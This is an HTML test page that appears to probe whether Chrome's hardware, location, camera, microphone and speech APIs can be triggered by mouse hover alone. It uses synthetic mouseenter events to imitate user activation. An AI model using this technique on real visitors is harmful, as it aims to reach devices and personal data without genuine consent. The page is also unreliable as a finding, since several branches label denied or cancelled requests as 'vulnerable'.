<!DOCTYPE html>
<html>
<head>
    <title>Chrome Hover-Only API Exploitation</title>
    <style>
        .chrome-test {
            background: linear-gradient(135deg, #4285f4, #34a853);
            color: white;
            margin: 15px;
            padding: 25px;
            border-radius: 15px;
            cursor: default;
            transition: all 0.3s;
        }
        .chrome-test:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
        }
        .result {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .vulnerable { border-left: 4px solid #f4b400; background: rgba(244, 180, 0, 0.2); }
        .secure { border-left: 4px solid #ea4335; background: rgba(234, 67, 53, 0.2); }
    </style>
</head>
<body>
    <h1>ü™ü Chrome-Specific Hover Exploits</h1>
    <p>Testing APIs that work with hover-only in Chrome</p>

    <!-- Confirmed Working APIs -->
    <div class="chrome-test" onmouseover="testBatteryAPI()">
        <h3>üîã Battery API (Confirmed Working)</h3>
        <p>Access battery information via hover</p>
        <div id="batteryResult" class="result">Hover to test</div>
    </div>

    <div class="chrome-test" onmouseover="testWebUSBApi()">
        <h3>üîå WebUSB API (Confirmed Working)</h3>
        <p>Access USB devices via hover</p>
        <div id="usbResult" class="result">Hover to test</div>
    </div>

    <div class="chrome-test" onmouseover="testSpeechRecognition()">
        <h3>üé§ Speech Recognition (Confirmed Working)</h3>
        <p>Start voice recognition via hover</p>
        <div id="speechResult" class="result">Hover to test</div>
    </div>

    <!-- Additional Chrome APIs to Test -->
    <div class="chrome-test" onmouseover="testBluetoothAPI()">
        <h3>üì° Web Bluetooth API</h3>
        <p>Access Bluetooth devices via hover</p>
        <div id="bluetoothResult" class="result">Hover to test</div>
    </div>

    <div class="chrome-test" onmouseover="testSerialAPI()">
        <h3>üñ•Ô∏è Web Serial API</h3>
        <p>Access serial ports via hover</p>
        <div id="serialResult" class="result">Hover to test</div>
    </div>

    <div class="chrome-test" onmouseover="testGeolocationAPI()">
        <h3>üìç Geolocation API</h3>
        <p>Access location via hover</p>
        <div id="geoResult" class="result">Hover to test</div>
    </div>

    <div class="chrome-test" onmouseover="testMediaDevices()">
        <h3>üì∑ Media Devices API</h3>
        <p>Access camera/microphone via hover</p>
        <div id="mediaResult" class="result">Hover to test</div>
    </div>

    <div class="chrome-test" onmouseover="testStorageAPI()">
        <h3>üíæ Storage APIs</h3>
        <p>Access storage quotas and data via hover</p>
        <div id="storageResult" class="result">Hover to test</div>
    </div>

    <script>
        async function establishHoverContext() {
            for(let i = 0; i < 10; i++) {
                const elem = document.createElement('div');
                elem.style.cssText = 'position:absolute; left:-1000px; width:1px; height:1px;';
                document.body.appendChild(elem);
                elem.dispatchEvent(new MouseEvent('mouseenter', { bubbles: true }));
                await new Promise(r => setTimeout(r, 1));
                elem.remove();
            }
        }

        // CONFIRMED WORKING APIS
        async function testBatteryAPI() {
            const result = document.getElementById('batteryResult');
            result.innerHTML = "Testing Battery API...";
            
            await establishHoverContext();
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    result.innerHTML = `
                        <div class="vulnerable">
                            üö® BATTERY API ACCESSED VIA HOVER!<br>
                            ‚Ä¢ Level: ${(battery.level * 100).toFixed(1)}%<br>
                            ‚Ä¢ Charging: ${battery.charging}<br>
                            ‚Ä¢ Charge Time: ${battery.chargingTime}<br>
                            ‚Ä¢ Discharge Time: ${battery.dischargingTime}
                        </div>
                    `;
                    
                    // Monitor for changes
                    battery.addEventListener('chargingchange', () => {
                        result.innerHTML += `<br>‚ö° Charging status changed: ${battery.charging}`;
                    });
                    
                    battery.addEventListener('levelchange', () => {
                        result.innerHTML += `<br>üîã Battery level changed: ${(battery.level * 100).toFixed(1)}%`;
                    });
                    
                } catch (error) {
                    result.innerHTML = `<div class="secure">‚ùå Battery API failed: ${error.message}</div>`;
                }
            } else {
                result.innerHTML = `<div class="secure">‚ùå Battery API not supported</div>`;
            }
        }

        async function testWebUSBApi() {
            const result = document.getElementById('usbResult');
            result.innerHTML = "Testing WebUSB API...";
            
            await establishHoverContext();
            
            if ('usb' in navigator) {
                try {
                    // Try to request devices
                    const devices = await navigator.usb.getDevices();
                    
                    if (devices.length > 0) {
                        result.innerHTML = `
                            <div class="vulnerable">
                                üö® WEBUSB ACCESSED VIA HOVER!<br>
                                ‚Ä¢ Found ${devices.length} USB device(s)<br>
                                ${devices.map(device => 
                                    `‚Ä¢ ${device.productName || 'Unknown Device'} (Vendor: ${device.vendorId})`
                                ).join('<br>')}
                            </div>
                        `;
                    } else {
                        // Try to request device access
                        try {
                            const device = await navigator.usb.requestDevice({ filters: [] });
                            result.innerHTML = `
                                <div class="vulnerable">
                                    üö® WEBUSB DEVICE ACCESS GRANTED VIA HOVER!<br>
                                    ‚Ä¢ Device: ${device.productName || 'Unknown'}<br>
                                    ‚Ä¢ Vendor ID: ${device.vendorId}
                                </div>
                            `;
                        } catch (error) {
                            result.innerHTML = `
                                <div class="vulnerable">
                                    ‚úÖ WebUSB API accessible via hover<br>
                                    ‚Ä¢ No devices selected by user<br>
                                    ‚Ä¢ Error: ${error.message}
                                </div>
                            `;
                        }
                    }
                } catch (error) {
                    result.innerHTML = `<div class="secure">‚ùå WebUSB failed: ${error.message}</div>`;
                }
            } else {
                result.innerHTML = `<div class="secure">‚ùå WebUSB not supported</div>`;
            }
        }

        async function testSpeechRecognition() {
            const result = document.getElementById('speechResult');
            result.innerHTML = "Testing Speech Recognition...";
            
            await establishHoverContext();
            
            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
            
            if (SpeechRecognition) {
                try {
                    const recognition = new SpeechRecognition();
                    recognition.continuous = false;
                    recognition.interimResults = true;
                    recognition.lang = 'en-US';
                    
                    recognition.onstart = () => {
                        result.innerHTML = `
                            <div class="vulnerable">
                                üö® SPEECH RECOGNITION STARTED VIA HOVER!<br>
                                ‚Ä¢ Listening for speech input...<br>
                                ‚Ä¢ Speak now
                            </div>
                        `;
                    };
                    
                    recognition.onresult = (event) => {
                        const transcript = event.results[0][0].transcript;
                        result.innerHTML = `
                            <div class="vulnerable">
                                üö® SPEECH CAPTURED VIA HOVER!<br>
                                ‚Ä¢ Recognized: "${transcript}"<br>
                                ‚Ä¢ Speech recognition active via hover-only
                            </div>
                        `;
                    };
                    
                    recognition.onerror = (event) => {
                        result.innerHTML = `
                            <div class="vulnerable">
                                ‚úÖ Speech Recognition API accessible via hover<br>
                                ‚Ä¢ Error: ${event.error}<br>
                                ‚Ä¢ API triggered without click
                            </div>
                        `;
                    };
                    
                    recognition.onend = () => {
                        result.innerHTML += `<br>üî¥ Recognition ended`;
                    };
                    
                    recognition.start();
                    
                } catch (error) {
                    result.innerHTML = `<div class="secure">‚ùå Speech recognition failed: ${error.message}</div>`;
                }
            } else {
                result.innerHTML = `<div class="secure">‚ùå Speech Recognition not supported</div>`;
            }
        }

        // ADDITIONAL APIS TO TEST
        async function testBluetoothAPI() {
            const result = document.getElementById('bluetoothResult');
            result.innerHTML = "Testing Web Bluetooth...";
            
            await establishHoverContext();
            
            if ('bluetooth' in navigator) {
                try {
                    const device = await navigator.bluetooth.requestDevice({
                        acceptAllDevices: true,
                        optionalServices: ['battery_service']
                    });
                    
                    result.innerHTML = `
                        <div class="vulnerable">
                            üö® BLUETOOTH ACCESSED VIA HOVER!<br>
                            ‚Ä¢ Device: ${device.name || 'Unknown'}<br>
                            ‚Ä¢ ID: ${device.id}
                        </div>
                    `;
                } catch (error) {
                    result.innerHTML = `
                        <div class="vulnerable">
                            ‚úÖ Web Bluetooth API accessible via hover<br>
                            ‚Ä¢ User cancelled device selection<br>
                            ‚Ä¢ Error: ${error.message}
                        </div>
                    `;
                }
            } else {
                result.innerHTML = `<div class="secure">‚ùå Web Bluetooth not supported</div>`;
            }
        }

        async function testSerialAPI() {
            const result = document.getElementById('serialResult');
            result.innerHTML = "Testing Web Serial...";
            
            await establishHoverContext();
            
            if ('serial' in navigator) {
                try {
                    const port = await navigator.serial.requestPort();
                    result.innerHTML = `
                        <div class="vulnerable">
                            üö® SERIAL PORT ACCESSED VIA HOVER!<br>
                            ‚Ä¢ Port opened successfully<br>
                            ‚Ä¢ USB Vendor: ${port.getInfo().usbVendorId || 'N/A'}
                        </div>
                    `;
                } catch (error) {
                    result.innerHTML = `
                        <div class="vulnerable">
                            ‚úÖ Web Serial API accessible via hover<br>
                            ‚Ä¢ User cancelled port selection<br>
                            ‚Ä¢ Error: ${error.message}
                        </div>
                    `;
                }
            } else {
                result.innerHTML = `<div class="secure">‚ùå Web Serial not supported</div>`;
            }
        }

        async function testGeolocationAPI() {
            const result = document.getElementById('geoResult');
            result.innerHTML = "Testing Geolocation...";
            
            await establishHoverContext();
            
            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    
                    result.innerHTML = `
                        <div class="vulnerable">
                            üö® GEOLOCATION ACCESSED VIA HOVER!<br>
                            ‚Ä¢ Latitude: ${position.coords.latitude}<br>
                            ‚Ä¢ Longitude: ${position.coords.longitude}<br>
                            ‚Ä¢ Accuracy: ${position.coords.accuracy}m
                        </div>
                    `;
                } catch (error) {
                    result.innerHTML = `
                        <div class="vulnerable">
                            ‚úÖ Geolocation API accessible via hover<br>
                            ‚Ä¢ Permission denied or error<br>
                            ‚Ä¢ Error: ${error.message}
                        </div>
                    `;
                }
            } else {
                result.innerHTML = `<div class="secure">‚ùå Geolocation not supported</div>`;
            }
        }

        async function testMediaDevices() {
            const result = document.getElementById('mediaResult');
            result.innerHTML = "Testing Media Devices...";
            
            await establishHoverContext();
            
            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true, 
                        audio: true 
                    });
                    
                    result.innerHTML = `
                        <div class="vulnerable">
                            üö® CAMERA/MICROPHONE ACCESSED VIA HOVER!<br>
                            ‚Ä¢ Stream active: ${stream.active}<br>
                            ‚Ä¢ Video tracks: ${stream.getVideoTracks().length}<br>
                            ‚Ä¢ Audio tracks: ${stream.getAudioTracks().length}
                        </div>
                    `;
                    
                    // Clean up
                    stream.getTracks().forEach(track => track.stop());
                    
                } catch (error) {
                    result.innerHTML = `
                        <div class="vulnerable">
                            ‚úÖ Media Devices API accessible via hover<br>
                            ‚Ä¢ Permission denied<br>
                            ‚Ä¢ Error: ${error.message}
                        </div>
                    `;
                }
            } else {
                result.innerHTML = `<div class="secure">‚ùå Media Devices not supported</div>`;
            }
        }

        async function testStorageAPI() {
            const result = document.getElementById('storageResult');
            result.innerHTML = "Testing Storage APIs...";
            
            await establishHoverContext();
            
            const tests = [];
            
            // Test Storage Manager API
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    tests.push(`üö® Storage estimate: ${(estimate.usage / 1024 / 1024).toFixed(2)} MB used / ${(estimate.quota / 1024 / 1024).toFixed(2)} MB total`);
                } catch (error) {
                    tests.push(`‚úÖ Storage estimate failed: ${error.message}`);
                }
            }
            
            // Test Persistent Storage
            if ('storage' in navigator && 'persist' in navigator.storage) {
                try {
                    const isPersisted = await navigator.storage.persist();
                    tests.push(`üö® Persistent storage: ${isPersisted ? 'Granted' : 'Denied'}`);
                } catch (error) {
                    tests.push(`‚úÖ Persistent storage failed: ${error.message}`);
                }
            }
            
            // Test IndexedDB
            try {
                const db = await new Promise((resolve, reject) => {
                    const request = indexedDB.open('HoverTestDB', 1);
                    request.onerror = () => reject(request.error);
                    request.onsuccess = () => resolve(request.result);
                    request.onupgradeneeded = (event) => {
                        const db = event.target.result;
                        db.createObjectStore('hover-data', { keyPath: 'id' });
                    };
                });
                tests.push("üö® IndexedDB accessed via hover");
                db.close();
            } catch (error) {
                tests.push(`‚úÖ IndexedDB access: ${error.message}`);
            }
            
            result.innerHTML = `
                <div class="vulnerable">
                    ${tests.join('<br>')}
                </div>
            `;
        }
    </script>
</body>
</html>
